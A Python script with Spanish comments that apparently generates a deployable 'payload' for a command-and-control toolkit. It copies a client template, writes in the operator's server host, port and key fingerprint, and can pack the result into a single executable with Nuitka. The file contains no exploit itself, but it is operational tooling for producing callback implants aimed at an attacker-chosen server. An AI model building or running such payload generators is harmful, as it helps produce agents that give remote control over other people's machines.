#!/usr/bin/env python3
import os
import re
import subprocess
import sys
import hashlib
from cryptography.hazmat.primitives import serialization, hashes

script_dir = os.path.dirname(__file__)
TEMPLATE_PATH = f"{script_dir}/BlackBerryC.py"

def get_server_key_fingerprint():
    """
    Obtiene el fingerprint de la clave RSA del servidor desde el código actual
    para incluirlo en el payload generado.
    """
    try:
        # Importar el módulo del servidor para obtener la clave pública
        sys.path.insert(0, script_dir)
        
        # Intentar obtener la clave desde el servidor en ejecución
        try:
            from __main__ import SERVER_PUBLIC_PEM
            server_key_pem = SERVER_PUBLIC_PEM
        except ImportError:
            # Si no está disponible, generar una temporal para obtener el formato
            from cryptography.hazmat.primitives.asymmetric import rsa
            temp_private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            server_key_pem = temp_private_key.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            print(f"[WARNING] Usando clave temporal para fingerprint (servidor no está ejecutándose)")
        
        # Cargar la clave y calcular fingerprint
        if isinstance(server_key_pem, bytes):
            pem_data = server_key_pem
        else:
            pem_data = server_key_pem.encode('utf-8')
        
        public_key = serialization.load_pem_public_key(pem_data)
        
        # Obtener bytes DER para fingerprint consistente
        der_bytes = public_key.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        # Calcular SHA256
        fingerprint = hashlib.sha256(der_bytes).hexdigest()
        
        # Formatear como grupos de 2 caracteres separados por ':'
        formatted_fp = ':'.join(fingerprint[i:i+2] for i in range(0, len(fingerprint), 2))
        
        return formatted_fp, server_key_pem.decode() if isinstance(server_key_pem, bytes) else server_key_pem
        
    except Exception as e:
        print(f"[ERROR] No se pudo obtener el fingerprint del servidor: {e}")
        return None, None

def generate_payload_with_verification():
    """
    Genera un payload con verificación de fingerprint incorporada
    """
    if not os.path.isfile(TEMPLATE_PATH):
        print(f"Error: no existe '{TEMPLATE_PATH}'")
        sys.exit(1)
    
    # Obtener datos del servidor
    host = input("Host del servidor: ").strip()
    port_str = input("Puerto del servidor: ").strip()
    
    try:
        port = int(port_str)
    except ValueError:
        print("Puerto inválido")
        sys.exit(1)
    
    # Opciones de verificación
    enable_verification = input("¿Habilitar verificación de fingerprint? (S/n): ").strip().lower()
    enable_verification = enable_verification in ['', 's', 'si', 'y', 'yes']
    
    fingerprint = None
    if enable_verification:
        # Obtener fingerprint del servidor
        fingerprint, server_pem = get_server_key_fingerprint()
        if fingerprint:
            print(f"[INFO] Fingerprint del servidor: {fingerprint}")
            confirm = input("¿Usar este fingerprint para verificación? (S/n): ").strip().lower()
            if confirm not in ['', 's', 'si', 'y', 'yes']:
                manual_fp = input("Ingrese fingerprint manualmente (formato xx:xx:xx...): ").strip()
                if manual_fp and ':' in manual_fp:
                    fingerprint = manual_fp
                else:
                    print("[WARNING] Fingerprint inválido, continuando sin verificación")
                    enable_verification = False
        else:
            print("[WARNING] No se pudo obtener fingerprint, continuando sin verificación")
            enable_verification = False
    
    salida = input("Nombre de salida (ENTER para 'Payload-CBlackBerry.py'): ").strip() or "Payload-CBlackBerry.py"
    
    # Leer el archivo original
    with open(TEMPLATE_PATH, "r") as f:
        code = f.read()
    
    # Reemplazar PROXY_HOST y PROXY_PORT
    code = re.sub(
        r"SERVER_HOST\s*=\s*['\"].*?['\"]",
        f"SERVER_HOST = '{host}'",
        code
    )
    code = re.sub(
        r"SERVER_PORT\s*=\s*\d+",
        f"SERVER_PORT = {port}",
        code
    )
    
    # Agregar verificación de fingerprint si está habilitada
    if enable_verification and fingerprint:
        verification_code = f'''
# Configuración de verificación de fingerprint
ENABLE_FINGERPRINT_VERIFICATION = True
EXPECTED_FINGERPRINT = "{fingerprint}"
'''
        
        # Insertar el código de verificación después de los imports
        import_section_end = code.find('\n\n', code.find('SERVER_PORT'))
        if import_section_end != -1:
            code = code[:import_section_end] + verification_code + code[import_section_end:]

        # Eliminar configuraciones conflictivas que puedan sobrescribir la configuración
        code = re.sub(
            r'ENABLE_FINGERPRINT_VERIFICATION = False\s*\n'
            r'EXPECTED_FINGERPRINT = ""',
            '',
            code,
            flags=re.MULTILINE
        )
        
    else:
        # Agregar configuración deshabilitada
        verification_code = '''
# Configuración de verificación de fingerprint (DESHABILITADA)
ENABLE_FINGERPRINT_VERIFICATION = False
EXPECTED_FINGERPRINT = ""
'''
        import_section_end = code.find('\n\n', code.find('SERVER_PORT'))
        if import_section_end != -1:
            code = code[:import_section_end] + verification_code + code[import_section_end:]
    
    # Guardar el nuevo payload
    try:
        with open(salida, "w") as f:
            f.write(code)
        print(f"[+] Payload generado: {salida}")
        if enable_verification and fingerprint:
            print(f"[+] Verificación de fingerprint habilitada")
            print(f"[+] Fingerprint esperado: {fingerprint}")
        else:
            print(f"[i] Verificación de fingerprint deshabilitada")
    except Exception as e:
        print(f"Error al escribir '{salida}': {e}")
        sys.exit(1)
    
    # Preguntar por compilación con Nuitka
    if input("¿Compilar con Nuitka? (s/N): ").strip().lower() == "s":
        try:
            print("[*] Compilando con Nuitka...")
            subprocess.run(
                ["nuitka3", "--onefile", salida],
                check=True
            )
            print("[+] Compilación completada.")
        except subprocess.CalledProcessError as e:
            print(f"Error al compilar: {e}")
        except FileNotFoundError:
            print("Error: Nuitka no está instalado o no está en el PATH")

def generate_payload():
    """Función principal de generación - mantiene compatibilidad"""
    generate_payload_with_verification()

if __name__ == "__main__":
    generate_payload_with_verification()